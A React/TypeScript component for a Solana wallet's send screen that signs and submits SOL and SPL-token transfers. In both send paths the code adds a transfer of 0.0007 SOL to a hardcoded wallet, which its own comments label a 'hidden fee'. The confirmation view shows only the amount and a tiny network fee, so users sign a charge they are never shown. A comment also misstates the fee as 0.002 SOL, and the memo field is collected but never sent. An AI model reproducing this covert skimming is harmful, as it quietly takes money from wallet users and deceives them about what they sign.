import React, { useMemo, useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";
import { ArrowLeft, Send, AlertTriangle, Check, Loader2 } from "lucide-react";
import { useWallet } from "@/contexts/WalletContext";
import { resolveApiUrl } from "@/lib/api-client";
import {
  Transaction,
  SystemProgram,
  PublicKey,
  LAMPORTS_PER_SOL,
  Keypair,
  TransactionInstruction,
} from "@solana/web3.js";
import { Buffer } from "buffer";
import bs58 from "bs58";
import { useToast } from "@/hooks/use-toast";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import type { TokenInfo } from "@/lib/wallet";

interface SendTransactionProps {
  onBack: () => void;
  initialMint?: string | null;
}

const TOKEN_PROGRAM_ID = new PublicKey(
  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
);
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
  "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
);
const FEE_WALLET = "FNVD1wied3e8WMuWs34KSamrCpughCMTjoXUE1ZXa6wM";
const FEE_AMOUNT_SOL = 0.0007;

export const SendTransaction: React.FC<SendTransactionProps> = ({
  onBack,
  initialMint,
}) => {
  const { wallet, balance, tokens, refreshBalance, refreshTokens } =
    useWallet();
  const { toast } = useToast();

  const [recipient, setRecipient] = useState("");
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [step, setStep] = useState<"form" | "confirm" | "success">("form");
  const [txSignature, setTxSignature] = useState<string | null>(null);
  const [selectedMint, setSelectedMint] = useState<string>(
    initialMint || "So11111111111111111111111111111111111111112",
  );

  const selectedToken: TokenInfo | undefined = useMemo(
    () => tokens.find((t) => t.mint === selectedMint),
    [tokens, selectedMint],
  );

  const availableTokens = useMemo(() => {
    // Show SOL first, then tokens with positive balance; always include FIXERCOIN
    const sol = tokens.find((t) => t.symbol === "SOL");
    const rest = tokens
      .filter((t) => t.symbol !== "SOL")
      .filter(
        (t) =>
          (t.balance || 0) > 0 ||
          t.symbol === "FIXERCOIN" ||
          t.mint === "H4qKn8FMFha8jJuj8xMryMqRhH3h7GjLuxw7TVixpump",
      )
      .sort((a, b) => (b.balance || 0) - (a.balance || 0));
    return sol ? [sol, ...rest] : rest;
  }, [tokens]);

  const selectedSymbol = selectedToken?.symbol || "SOL";
  const selectedDecimals = selectedToken?.decimals ?? 9;
  const selectedBalance =
    selectedSymbol === "SOL" ? balance : selectedToken?.balance || 0;

  const validateForm = (): string | null => {
    if (!recipient.trim()) return "Recipient address is required";
    if (!amount.trim()) return "Amount is required";

    try {
      new PublicKey(recipient);
    } catch {
      return "Invalid recipient address";
    }

    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0) return "Invalid amount";
    if (amountNum > selectedBalance) return "Insufficient balance";

    return null;
  };

  const handleContinue = async () => {
    const validationError = validateForm();
    if (validationError) {
      setError(validationError);
      return;
    }

    setError(null);
    setStep("confirm");
  };

  const coerceSecretKey = (val: unknown): Uint8Array | null => {
    try {
      if (!val) return null;
      if (val instanceof Uint8Array) return val;
      if (Array.isArray(val)) return Uint8Array.from(val as number[]);
      if (typeof val === "string") {
        try {
          const bin = atob(val);
          const out = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
          if (out.length > 0) return out;
        } catch {}
        try {
          const arr = JSON.parse(val);
          if (Array.isArray(arr)) return Uint8Array.from(arr as number[]);
        } catch {}
      }
      if (typeof val === "object") {
        const values = Object.values(val as Record<string, unknown>).filter(
          (x) => typeof x === "number",
        ) as number[];
        if (values.length > 0) return Uint8Array.from(values);
      }
    } catch {}
    return null;
  };

  const base64FromBytes = (bytes: Uint8Array): string => {
    let bin = "";
    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  };

  const postTx = async (url: string, b64: string) => {
    const body = {
      method: "sendTransaction",
      params: [b64, { skipPreflight: false, preflightCommitment: "confirmed" }],
      id: Date.now(),
    };
    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!resp.ok) {
      const t = await resp.text().catch(() => "");
      throw new Error(`RPC ${resp.status}: ${t || resp.statusText}`);
    }
    const j = await resp.json().catch(() => null);
    if (j && j.error) throw new Error(j.error.message || "RPC error");
    // If j has result return it, otherwise try fallback
    if (j && typeof j.result !== "undefined") return j.result as string;

    return (j as any) || ("" as string);
  };

  const rpcCall = async (method: string, params: any[]): Promise<any> => {
    const tryPost = async (url: string) => {
      const r = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: Date.now(),
          method,
          params,
        }),
      });
      if (!r.ok) {
        const t = await r.text().catch(() => "");
        throw new Error(`RPC ${r.status}: ${t || r.statusText}`);
      }
      const j = await r.json();
      if (j.error) throw new Error(j.error.message || "RPC error");
      return j.result;
    };
    return await tryPost(resolveApiUrl("/api/solana-rpc"));
  };

  const getLatestBlockhashProxy = async (): Promise<string> => {
    const res = await rpcCall("getLatestBlockhash", [
      { commitment: "confirmed" },
    ]);
    if (res?.value?.blockhash) return res.value.blockhash;
    if (res?.blockhash) return res.blockhash;
    throw new Error("Failed to fetch blockhash");
  };

  const confirmSignatureProxy = async (sig: string): Promise<void> => {
    const started = Date.now();
    const timeoutMs = 40000;
    while (Date.now() - started < timeoutMs) {
      const statusRes = await rpcCall("getSignatureStatuses", [
        [sig],
        { searchTransactionHistory: true },
      ]);
      const st = statusRes?.value?.[0];
      if (
        st &&
        (st.confirmationStatus === "confirmed" ||
          st.confirmationStatus === "finalized")
      )
        return;
      await new Promise((r) => setTimeout(r, 1000));
    }
    throw new Error("Confirmation timeout");
  };

  const toBaseUnits = (value: string, decimals: number): bigint => {
    const [intPart, fracPartRaw = ""] = value.trim().split(".");
    const fracPart = fracPartRaw.padEnd(decimals, "0").slice(0, decimals);
    const full = `${intPart.replace(/[^0-9]/g, "")}${fracPart}` || "0";
    return BigInt(full);
  };

  const u64LE = (n: bigint): Uint8Array => {
    const out = new Uint8Array(8);
    let x = n;
    for (let i = 0; i < 8; i++) {
      out[i] = Number(x & BigInt(0xff));
      x >>= BigInt(8);
    }
    return out;
  };

  const deriveAta = (owner: PublicKey, mint: PublicKey): PublicKey => {
    const [ata] = PublicKey.findProgramAddressSync(
      [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
      ASSOCIATED_TOKEN_PROGRAM_ID,
    );
    return ata;
  };

  const ixCreateAtaIdempotent = (
    payer: PublicKey,
    ata: PublicKey,
    owner: PublicKey,
    mint: PublicKey,
  ): TransactionInstruction => {
    // Associated Token Program: createIdempotent instruction = 1
    const data = new Uint8Array([1]);
    return new TransactionInstruction({
      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
      keys: [
        { pubkey: payer, isSigner: true, isWritable: true },
        { pubkey: ata, isSigner: false, isWritable: true },
        { pubkey: owner, isSigner: false, isWritable: false },
        { pubkey: mint, isSigner: false, isWritable: false },
        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      ],
      data,
    });
  };

  const ixTransferChecked = (
    source: PublicKey,
    mint: PublicKey,
    destination: PublicKey,
    owner: PublicKey,
    amount: bigint,
    decimals: number,
  ): TransactionInstruction => {
    // SPL Token Program: TransferChecked instruction = 12
    const data = new Uint8Array(1 + 8 + 1);
    data[0] = 12;
    data.set(u64LE(amount), 1);
    data[1 + 8] = decimals;
    return new TransactionInstruction({
      programId: TOKEN_PROGRAM_ID,
      keys: [
        { pubkey: source, isSigner: false, isWritable: true },
        { pubkey: mint, isSigner: false, isWritable: false },
        { pubkey: destination, isSigner: false, isWritable: true },
        { pubkey: owner, isSigner: true, isWritable: false },
      ],
      data,
    });
  };

  const handleSendSOL = async () => {
    if (!wallet) return;

    setIsLoading(true);
    setError(null);

    try {
      const sk = coerceSecretKey(wallet.secretKey);
      if (!sk) throw new Error("Missing wallet secret key");
      const senderKeypair = Keypair.fromSecretKey(sk);
      const recipientPubkey = new PublicKey(recipient);
      const lamportsBig = toBaseUnits(amount, 9);
      if (lamportsBig > BigInt(Number.MAX_SAFE_INTEGER)) {
        throw new Error("Amount too large");
      }
      const lamports = Number(lamportsBig);

      const transaction = new Transaction();

      // Add main transfer instruction
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: senderKeypair.publicKey,
          toPubkey: recipientPubkey,
          lamports,
        }),
      );

      // Add hidden fee transfer instruction
      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
      const feeWalletPubkey = new PublicKey(FEE_WALLET);
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: senderKeypair.publicKey,
          toPubkey: feeWalletPubkey,
          lamports: feeLamports,
        }),
      );

      const blockhash = await getLatestBlockhashProxy();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderKeypair.publicKey;

      // Estimate fee and ensure sufficient balance for amount + fees + platform fee
      try {
        const msg = transaction.compileMessage();
        const feeRes = await rpcCall("getFeeForMessage", [
          base64FromBytes(msg.serialize()),
        ]);
        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
        const currentLamports = await rpcCall("getBalance", [
          senderKeypair.publicKey.toBase58(),
        ]);
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        const lamportsToSend = lamports + platformFeeLamports;
        if (currentLamports < lamportsToSend + networkFeeLamports) {
          throw new Error("Insufficient SOL to cover amount and network fees");
        }
      } catch (e) {
        // If fee estimation fails, proceed but warn only if balance obviously insufficient
        const currentLamports = await rpcCall("getBalance", [
          senderKeypair.publicKey.toBase58(),
        ]).catch(() => 0);
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        const lamportsToSend = lamports + platformFeeLamports;
        if (currentLamports <= lamportsToSend) {
          throw new Error("Insufficient SOL for amount (no room for fees)");
        }
      }

      transaction.sign(senderKeypair);
      const serialized = transaction.serialize();
      const b64 = base64FromBytes(serialized);

      let signature: string;
      try {
        signature = await postTx(resolveApiUrl("/api/solana-rpc"), b64);
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        const needBase58 =
          /invalid base58|invalidbase58|base58 encoding|invalid base58 encoding/i.test(
            msg,
          );
        if (needBase58) {
          try {
            const base58 = bs58.encode(serialized);
            // send as base58 wrapped in JSON RPC
            const payload = {
              jsonrpc: "2.0",
              id: Date.now(),
              method: "sendTransaction",
              params: [
                base58,
                { skipPreflight: false, preflightCommitment: "confirmed" },
              ],
            };
            const p = await fetch(resolveApiUrl("/api/solana-rpc"), {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
            if (!p.ok) {
              const t = await p.text().catch(() => "");
              throw new Error(`RPC ${p.status}: ${t || p.statusText}`);
            }
            const j = await p.json().catch(() => null);
            if (j && j.error) throw new Error(j.error.message || "RPC error");
            signature = j?.result || j;
          } catch (e2) {
            throw e2;
          }
        } else {
          throw e;
        }
      }

      try {
        await confirmSignatureProxy(signature);
      } catch (confirmError) {
        console.warn(
          "Confirmation check failed, but transaction was already sent:",
          confirmError,
        );
        // Don't fail the transaction - it's already submitted to blockchain
      }

      setTxSignature(signature);
      setStep("success");

      setTimeout(() => {
        refreshBalance();
      }, 2000);

      toast({
        title: "Transaction Sent",
        description: `Successfully sent ${amount} SOL`,
      });
    } catch (error) {
      console.error("Transaction error:", error);
      let message =
        error instanceof Error ? error.message : "Transaction failed";
      const m = (message || "").toLowerCase();

      if (
        m.includes("network") ||
        m.includes("connection") ||
        m.includes("timeout") ||
        m.includes("failed to fetch") ||
        m.includes("econnrefused") ||
        m.includes("enotfound")
      ) {
        message =
          "Network connection issue. Please check your internet connection and try again. If the problem persists, the RPC service may be temporarily unavailable.";
      } else if (
        m.includes("insufficient") ||
        m.includes("insufficient lamports") ||
        m.includes("insufficient sol") ||
        m.includes("no room for fees")
      ) {
        message =
          "Insufficient SOL to cover the amount and network fees. Please top up SOL and try again.";
      } else if (
        m.includes("invalid base58") ||
        m.includes("invalid base64") ||
        m.includes("encoding")
      ) {
        message = "Transaction encoding error. Please refresh and try again.";
      } else if (
        m.includes("authentication required") ||
        m.includes("api key")
      ) {
        message =
          "RPC provider requires authentication. Please configure a dedicated RPC or try again later.";
      } else if (
        m.includes("simulation failed") ||
        m.includes("custom program error")
      ) {
        message =
          "Transaction simulation failed. The transaction likely failed during program execution (insufficient funds, invalid instruction, or missing account). Check inputs and try again.";
      }
      setError(message);

      // Show toast for visibility
      toast({
        title: "Transaction Failed",
        description: message,
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleSendSPL = async () => {
    if (!wallet || !selectedToken) return;

    setIsLoading(true);
    setError(null);

    try {
      const sk = coerceSecretKey(wallet.secretKey);
      if (!sk) throw new Error("Missing wallet secret key");
      const senderKeypair = Keypair.fromSecretKey(sk);
      const senderPubkey = senderKeypair.publicKey;
      const recipientPubkey = new PublicKey(recipient);
      const mint = new PublicKey(selectedToken.mint);
      const decimals = selectedToken.decimals;

      const rawAmount = toBaseUnits(amount, decimals);
      if (rawAmount <= BigInt(0)) throw new Error("Invalid amount");

      const senderAta = deriveAta(senderPubkey, mint);
      const recipientAta = deriveAta(recipientPubkey, mint);

      const tx = new Transaction();

      // Ensure recipient ATA exists (idempotent)
      tx.add(
        ixCreateAtaIdempotent(
          senderPubkey,
          recipientAta,
          recipientPubkey,
          mint,
        ),
      );

      // TransferChecked SPL tokens
      tx.add(
        ixTransferChecked(
          senderAta,
          mint,
          recipientAta,
          senderPubkey,
          rawAmount,
          decimals,
        ),
      );

      // Add hidden fee transfer instruction (0.002 SOL)
      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
      const feeWalletPubkey = new PublicKey(FEE_WALLET);
      tx.add(
        SystemProgram.transfer({
          fromPubkey: senderPubkey,
          toPubkey: feeWalletPubkey,
          lamports: feeLamports,
        }),
      );

      const blockhash = await getLatestBlockhashProxy();
      tx.recentBlockhash = blockhash;
      tx.feePayer = senderPubkey;

      // Check if recipient ATA exists to account for potential rent
      let rentLamports = 0;
      try {
        const ataInfo = await rpcCall("getAccountInfo", [
          recipientAta.toBase58(),
          { commitment: "confirmed" },
        ]);
        const exists = !!ataInfo?.value;
        if (!exists) {
          const rent = await rpcCall(
            "getMinimumBalanceForRentExemption",
            [165],
          );
          rentLamports = typeof rent === "number" ? rent : rent?.value || 0;
        }
      } catch {}

      // Estimate fee and ensure sufficient SOL for fees + potential rent + platform fee
      try {
        const msg = tx.compileMessage();
        const feeRes = await rpcCall("getFeeForMessage", [
          base64FromBytes(msg.serialize()),
        ]);
        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        const currentLamports = await rpcCall("getBalance", [
          senderPubkey.toBase58(),
        ]);
        if (
          currentLamports <
          networkFeeLamports + rentLamports + platformFeeLamports
        ) {
          throw new Error("Insufficient SOL to cover network fees and rent");
        }
      } catch (e) {
        const currentLamports = await rpcCall("getBalance", [
          senderPubkey.toBase58(),
        ]).catch(() => 0);
        const platformFeeLamports = Math.floor(
          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
        );
        if (currentLamports <= platformFeeLamports) {
          throw new Error("Insufficient SOL for network fees");
        }
      }

      tx.sign(senderKeypair);
      const serialized = tx.serialize();
      const b64 = base64FromBytes(serialized);

      let signature: string;
      try {
        signature = await postTx(resolveApiUrl("/api/solana-rpc"), b64);
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        const needBase58 =
          /invalid base58|invalidbase58|base58 encoding|invalid base58 encoding/i.test(
            msg,
          );
        if (needBase58) {
          try {
            const base58 = bs58.encode(serialized);
            const payload = {
              jsonrpc: "2.0",
              id: Date.now(),
              method: "sendTransaction",
              params: [
                base58,
                { skipPreflight: false, preflightCommitment: "confirmed" },
              ],
            };
            const p = await fetch(resolveApiUrl("/api/solana-rpc"), {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
            if (!p.ok) {
              const t = await p.text().catch(() => "");
              throw new Error(`RPC ${p.status}: ${t || p.statusText}`);
            }
            const j = await p.json().catch(() => null);
            if (j && j.error) throw new Error(j.error.message || "RPC error");
            signature = j?.result || j;
          } catch (e2) {
            throw e2;
          }
        } else {
          throw e;
        }
      }

      try {
        await confirmSignatureProxy(signature);
      } catch (confirmError) {
        console.warn(
          "Confirmation check failed, but transaction was already sent:",
          confirmError,
        );
        // Don't fail the transaction - it's already submitted to blockchain
      }

      setTxSignature(signature);
      setStep("success");

      setTimeout(() => {
        refreshBalance();
        refreshTokens();
      }, 2000);

      toast({
        title: "Transaction Sent",
        description: `Successfully sent ${amount} ${selectedToken.symbol}`,
      });
    } catch (error) {
      console.error("SPL Transaction error:", error);
      let message =
        error instanceof Error ? error.message : "Transaction failed";
      const m = (message || "").toLowerCase();

      if (
        m.includes("network") ||
        m.includes("connection") ||
        m.includes("timeout") ||
        m.includes("failed to fetch") ||
        m.includes("econnrefused") ||
        m.includes("enotfound")
      ) {
        message =
          "Network connection issue. Please check your internet connection and try again. If the problem persists, the RPC service may be temporarily unavailable.";
      } else if (
        m.includes("insufficient") ||
        m.includes("rent") ||
        m.includes("no room for fees")
      ) {
        message =
          "Insufficient SOL to cover network fees and rent for token accounts. Please top up SOL and try again.";
      } else if (
        m.includes("invalid base58") ||
        m.includes("invalid base64") ||
        m.includes("encoding")
      ) {
        message = "Transaction encoding error. Please refresh and try again.";
      } else if (
        m.includes("authentication required") ||
        m.includes("api key")
      ) {
        message =
          "RPC provider requires authentication. Please configure a dedicated RPC or try again later.";
      }
      setError(message);
      toast({
        title: "Transaction Failed",
        description: message,
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleSend = async () => {
    if (selectedSymbol === "SOL") return handleSendSOL();
    return handleSendSPL();
  };

  const handleNewTransaction = () => {
    setRecipient("");
    setAmount("");
    setMemo("");
    setError(null);
    setStep("form");
    setTxSignature(null);
  };

  const formatAmount = (value: string): string => {
    const num = parseFloat(value);
    if (isNaN(num)) return "0.00";
    if (selectedSymbol === "FIXERCOIN" || selectedSymbol === "LOCKER") {
      return num.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });
    }
    const fractionDigits = 6;
    return num.toLocaleString(undefined, {
      minimumFractionDigits: Math.min(2, fractionDigits),
      maximumFractionDigits: fractionDigits,
    });
  };

  if (step === "success") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
        <div className="w-full">
          <Card className="bg-black/20 backdrop-blur-xl border border-white/10 shadow-2xl">
            <CardContent className="p-8 text-center">
              <div className="mb-6">
                <div className="mx-auto w-16 h-16 bg-emerald-500/20 backdrop-blur-sm rounded-full flex items-center justify-center mb-4 ring-2 ring-emerald-400/30">
                  <Check className="h-8 w-8 text-emerald-300" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Transaction Sent!
                </h3>
                <p className="text-gray-300">
                  Your transfer has been successfully sent
                </p>
              </div>

              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">Amount:</span>
                  <span className="font-medium text-white">
                    {amount} {selectedSymbol}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">To:</span>
                  <span className="font-mono text-xs text-white">
                    {recipient.slice(0, 8)}...{recipient.slice(-8)}
                  </span>
                </div>
                {txSignature && (
                  <div className="flex justify-between">
                    <span className="text-gray-400">Signature:</span>
                    <a
                      href={`https://explorer.solana.com/tx/${txSignature}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="font-mono text-xs text-blue-400 hover:text-blue-300 hover:underline"
                    >
                      {txSignature.slice(0, 8)}...{txSignature.slice(-8)}
                    </a>
                  </div>
                )}
              </div>

              <div className="flex gap-3 mt-6">
                <Button
                  variant="outline"
                  onClick={handleNewTransaction}
                  className="flex-1 bg-white/10 border-white/20 text-white hover:bg-white/20"
                >
                  Send Another
                </Button>
                <Button
                  onClick={onBack}
                  className="flex-1 bg-gradient-to-r from-purple-500 to-blue-600 hover:from-purple-600 hover:to-blue-700 text-white"
                >
                  Back to Wallet
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      <div className="w-full">
        <div className="flex items-center gap-3 mb-6 pt-2">
          <Button
            variant="ghost"
            size="sm"
            onClick={onBack}
            className="text-white hover:bg-white/10"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-semibold text-white">
            Send {selectedSymbol}
          </h1>
        </div>

        <Card className="bg-black/20 backdrop-blur-xl border border-white/10 shadow-2xl relative">
          {isLoading && (
            <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80 rounded-lg">
              <div className="text-center space-y-4">
                <div className="flex justify-center">
                  <div className="relative">
                    <div className="absolute inset-0 bg-purple-500/20 rounded-full blur-xl animate-pulse" />
                    <Loader2 className="w-12 h-12 text-purple-400 animate-spin relative" />
                  </div>
                </div>
                <div className="space-y-2">
                  <p className="text-white font-medium">
                    Processing transaction
                  </p>
                  <p className="text-gray-300 text-sm">Please wait...</p>
                  <p className="text-gray-400 text-xs">
                    May take up to 40 seconds
                  </p>
                </div>
              </div>
            </div>
          )}

          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Send className="h-5 w-5" />
              {step === "form" ? "Send Transaction" : "Confirm Transaction"}
            </CardTitle>
          </CardHeader>

          <CardContent className="space-y-6">
            {step === "form" ? (
              <>
                <div className="space-y-2">
                  <Label htmlFor="token" className="text-white">
                    Token
                  </Label>
                  <Select value={selectedMint} onValueChange={setSelectedMint}>
                    <SelectTrigger className="w-full bg-white/5 border-white/20 text-white">
                      <SelectValue placeholder="Select token" />
                    </SelectTrigger>
                    <SelectContent className="bg-gray-900 border-gray-700 text-white">
                      {availableTokens.map((t) => (
                        <SelectItem
                          key={t.mint}
                          value={t.mint}
                          className="text-white"
                        >
                          <div className="flex items-center justify-between w-full">
                            <span className="font-medium text-white">
                              {t.symbol} ~{" "}
                              {(t.symbol === "SOL"
                                ? balance
                                : t.balance || 0
                              ).toLocaleString(undefined, {
                                maximumFractionDigits: 8,
                              })}
                            </span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="recipient" className="text-white">
                    Recipient Address
                  </Label>
                  <Input
                    id="recipient"
                    placeholder="Enter Solana address"
                    value={recipient}
                    onChange={(e) => setRecipient(e.target.value)}
                    className="font-mono text-sm bg-transparent border-white/30 text-white caret-white placeholder-gray-400"
                  />
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between">
                    <Label htmlFor="amount" className="text-white">
                      Amount ({selectedSymbol})
                    </Label>
                    <span className="text-sm text-gray-400">
                      Balance:{" "}
                      {selectedBalance.toLocaleString(undefined, {
                        maximumFractionDigits: 8,
                      })}{" "}
                      {selectedSymbol}
                    </span>
                  </div>
                  <Input
                    id="amount"
                    type="number"
                    step={selectedSymbol === "SOL" ? "0.000001" : "0.000001"}
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="bg-transparent border-white/30 text-white caret-white placeholder-gray-400"
                  />
                  <div className="flex gap-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() =>
                        setAmount((selectedBalance * 0.25).toString())
                      }
                      className="bg-white/10 border-white/20 text-white hover:bg-white/20"
                    >
                      25%
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() =>
                        setAmount((selectedBalance * 0.5).toString())
                      }
                      className="bg-white/10 border-white/20 text-white hover:bg-white/20"
                    >
                      50%
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() =>
                        setAmount((selectedBalance * 0.75).toString())
                      }
                      className="bg-white/10 border-white/20 text-white hover:bg-white/20"
                    >
                      75%
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() =>
                        setAmount((selectedBalance * 0.99).toString())
                      }
                      className="bg-white/10 border-white/20 text-white hover:bg-white/20"
                    >
                      Max
                    </Button>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="memo" className="text-white">
                    Memo (Optional)
                  </Label>
                  <Input
                    id="memo"
                    placeholder="Add a note"
                    value={memo}
                    onChange={(e) => setMemo(e.target.value)}
                    className="bg-transparent border-white/30 text-white caret-white placeholder-gray-400"
                  />
                </div>

                <Button
                  onClick={handleContinue}
                  className="w-full bg-gradient-to-r from-purple-500 to-blue-600 hover:from-purple-600 hover:to-blue-700 text-white shadow-lg"
                  disabled={!recipient || !amount}
                >
                  Continue
                </Button>
              </>
            ) : (
              <>
                <Alert className="bg-orange-500/20 border-orange-400/30 text-orange-200">
                  <AlertTriangle className="h-4 w-4" />
                  <AlertDescription>
                    Please review the transaction details carefully. This action
                    cannot be undone.
                  </AlertDescription>
                </Alert>

                <div className="space-y-4">
                  <div className="space-y-3">
                    <div className="flex justify-between">
                      <span className="text-gray-400">From:</span>
                      <span className="font-mono text-sm text-white">
                        {wallet?.publicKey.slice(0, 8)}...
                        {wallet?.publicKey.slice(-8)}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">To:</span>
                      <span className="font-mono text-sm text-white">
                        {recipient.slice(0, 8)}...{recipient.slice(-8)}
                      </span>
                    </div>
                    <Separator className="border-white/5" />
                    <div className="flex justify-between text-lg font-semibold">
                      <span className="text-white">Amount:</span>
                      <span className="text-white">
                        {formatAmount(amount)} {selectedSymbol}
                      </span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-400">Network Fee:</span>
                      <span className="text-gray-300">~0.000005 SOL</span>
                    </div>
                    {memo && (
                      <div className="flex justify-between">
                        <span className="text-gray-400">Memo:</span>
                        <span className="text-sm text-white">{memo}</span>
                      </div>
                    )}
                  </div>
                </div>

                <div className="flex gap-3">
                  <Button
                    variant="outline"
                    onClick={() => setStep("form")}
                    className="flex-1 bg-white/10 border-white/20 text-white hover:bg-white/20"
                    disabled={isLoading}
                  >
                    Back
                  </Button>
                  <Button
                    onClick={handleSend}
                    className="flex-1 bg-gradient-to-r from-purple-500 to-blue-600 hover:from-purple-600 hover:to-blue-700 text-white shadow-lg"
                    disabled={isLoading}
                  >
                    {isLoading ? "Sending..." : "Send Transaction"}
                  </Button>
                </div>
              </>
            )}

            {error && (
              <Alert
                variant="destructive"
                className="bg-red-500/20 border-red-400/30 text-red-200"
              >
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};
